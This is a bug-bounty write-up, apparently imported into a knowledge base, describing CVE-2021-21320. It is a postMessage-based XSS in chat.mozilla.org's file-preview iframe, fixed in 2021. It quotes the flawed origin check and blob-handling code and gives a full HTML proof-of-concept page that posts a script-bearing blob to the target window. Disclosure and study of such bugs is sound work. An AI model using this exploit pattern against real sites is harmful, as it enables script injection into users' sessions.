---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-05-20_xss-via-postmessage-in-chatmozillaorg.md
original_filename: 2021-05-20_xss-via-postmessage-in-chatmozillaorg.md
title: XSS via postMessage in chat.mozilla.org
category: blogs
detected_topics:
- xss
- command-injection
- file-upload
- api-security
tags:
- imported
- blogs
- xss
- command-injection
- file-upload
- api-security
language: en
raw_sha256: ba97eed77a289b040fbefa31ef01046fa20fe9b288d31bb1033c95bfa39b2e33
text_sha256: 553c47d57b262d2e5c7faf8a04bf934ddd58efb4643fe67cb7692d0706369dcf
ingested_at: '2026-06-28T07:32:06Z'
sensitivity: unknown
redactions_applied: false
---

# XSS via postMessage in chat.mozilla.org

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-05-20_xss-via-postmessage-in-chatmozillaorg.md
- Source Type: markdown
- Detected Topics: xss, command-injection, file-upload, api-security
- Ingested At: 2026-06-28T07:32:06Z
- Redactions Applied: False
- Raw SHA256: `ba97eed77a289b040fbefa31ef01046fa20fe9b288d31bb1033c95bfa39b2e33`
- Text SHA256: `553c47d57b262d2e5c7faf8a04bf934ddd58efb4643fe67cb7692d0706369dcf`


## Content

---
title: "XSS via postMessage in chat.mozilla.org"
page_title: "XSS via postMessage in chat.mozilla.org (CVE-2021-21320)"
url: "https://keerok.github.io/2021/05/09/XSS-via-postMessage-in-chat-mozilla-org-CVE-2021-21320/"
final_url: "https://keerok.github.io/2021/05/09/XSS-via-postMessage-in-chat-mozilla-org-CVE-2021-21320/"
authors: ["Guilherme Keerok (@k33r0k)"]
programs: ["Mozilla"]
bugs: ["XSS", "postMessage"]
bounty: "500"
publication_date: "2021-05-20"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3636
---

#  XSS via postMessage in chat.mozilla.org (CVE-2021-21320) 

Guilherme Keerok

2021-05-09

In the last month, some friends and I have founded @duph0use, a house where we spent the last month doing bug bounties, researching, and working. At some point during the time I was there, I started searching for bugs in Mozilla, which led me to find 3 XSSes.

In this post I will only be showing one of these findings.

* * *

While I navigated through Mozilla products, I ended up finding chat.mozilla.org, which is a webchat maintained by Matrix.org.

Seeing this chat is also open source, I began by looking into the source, and discovered a file upload functionality. I tried several different things on it but didn’t get anywhere. However, the same functionality also had a preview of images/files after the upload, which was interesting.

The preview of the files were being made inside an `iframe`. In a common scenario, a regular user will click on the button of upload and will do a upload of some file, then this file will be transformed into a `blob`, and at the moment of the upload, the content of this `blob` will be sent to the server.

What made it possible for this attack to work was that the application was sending a `postMessage` to the iframe to create the blob. Also, this `iframe` was used to preview the images.

As you can see in the following code, the validation of the `postMessage` origin was done through user input:  
<https://github.com/matrix-org/matrix-react-sdk/blob/v3.14.0/src/usercontent/index.js#L1>
  
  
  1  
  2  
  3  
  4  
  5  
  6  
  

| 
  
  
  const params = window.location.search.substring(1).split('&');  
  let lockOrigin;  
  for (let i = 0; i < params.length; ++i) {  
  const parts = params[i].split('=');  
  if (parts[0] === 'origin') lockOrigin = decodeURIComponent(parts[1]);  
  }  
  
  
---|---  
  
Then the next step of the code received the `postMessage` and sent its data to `remoteRender`:  
<https://github.com/matrix-org/matrix-react-sdk/blob/v3.14.0/src/usercontent/index.js#L47>
  
  
  1  
  2  
  3  
  4  
  5  
  6  
  

| 
  
  
  window.onmessage = function(e) {  
  if (e.origin === lockOrigin) {  
  if (e.data.blob) remoteRender(e);  
  else remoteSetTint(e);  
  }  
  };  
  
  
---|---  
  
In the line `49`, the message retrieved a blob sent by the user (`e.data.blob`) and without verifying the `content-type`, passed its content to `createObjectURL` in the line `22`:  
<https://github.com/matrix-org/matrix-react-sdk/blob/v3.14.0/src/usercontent/index.js#L22>
  
  
  1  
  

| 
  
  
  a.href = window.URL.createObjectURL(data.blob);  
  
  
---|---  
  
The only thing a little annoying in this XSS is the necessity of user interaction, caused by the download attribute (line `19`). However, it is trivial:  
<https://github.com/matrix-org/matrix-react-sdk/blob/v3.14.0/src/usercontent/index.js#L19>
  
  
  1  
  

| 
  
  
  a.download = data.download;  
  
  
---|---  
  
Because of that, the user needs to click with the right button of the mouse over the image and then open it in another tab. To do that, I created a simple image saying “open this image in a new tab” and passed this image via `postMessage` in the `imgSrc` attribute (line `40`).

<https://github.com/matrix-org/matrix-react-sdk/blob/v3.14.0/src/usercontent/index.js#L40>
  
  
  1  
  

| 
  
  
  img.src = data.imgSrc;  
  
  
---|---  
  
This is my final PoC:
  
  
  1  
  2  
  3  
  4  
  5  
  6  
  7  
  8  
  9  
  10  
  11  
  12  
  13  
  14  
  15  
  16  
  17  
  

| 
  
  
  <html>  
  <head>  
  </head>  
  <body>  
  <center>Click anywhere in the page</center>  
  <script>  
  let x;  
  onclick = () => {  
  x = open("https://chat.mozilla.org/usercontent/?origin=https%3a%2f%2f"+document.domain);  
  setTimeout(() => {  
  const payload = new Blob(["<script>alert(1337)<\/script>"], { type : "text/html" });  
  x.postMessage({ blob: payload, imgSrc: "https://i.imgur.com/CMq55u9.png", auto: true}, "*");  
  }, 2500);  
  }  
  </script>  
  </body>  
  </html>  
  
  
---|---  
  
Here you can see the PoC video:  
<https://www.youtube.com/watch?v=nmio2rTn38Q>

* * *

# Timeline

  * 2021-02-13 - Reported the vulnerability
  * 2021-02-19 - Mozilla assigned a CVE ID
  * 2021-03-01 - Fixed the vulnerability
  * 2021-03-08 - $500 Bounty awarded
